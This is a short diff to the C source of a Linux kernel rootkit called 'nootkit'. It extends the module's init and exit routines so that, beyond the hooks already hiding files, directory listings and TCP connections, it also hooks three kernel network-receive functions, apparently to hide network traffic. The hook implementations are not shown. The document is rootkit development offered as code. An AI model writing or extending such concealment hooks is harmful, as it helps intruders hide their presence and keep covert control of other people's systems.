@@ -44,19 +44,26 @@ int nootkit_init(void)
         printk(KERN_ERR "nootkit: Failed to find all required kernel symbols, aborting.");
         return -EFAULT;
     }
-
+    
     hide_hook_set_getdents64();
     hide_hook_set_filldir64();
     hide_hook_set_tcp_seq_next();
+    hide_hook_set___netif_receive_skb();
+    hide_hook_set_netif_rx();
+    hide_hook_set_netif_receive_skb_list_internal();
 
     return 0;
 }
 
+
 void nootkit_exit(void)
 {
+    hide_hook_unset_getdents64();
     hide_hook_unset_filldir64();
     hide_hook_unset_tcp_seq_next();
-    hide_hook_unset_getdents64();
+    hide_hook_unset___netif_receive_skb();
+    hide_hook_unset_netif_rx();
+    hide_hook_unset_netif_receive_skb_list_internal();
 
     printk(KERN_INFO "Unloaded nootkit!\n");
 }
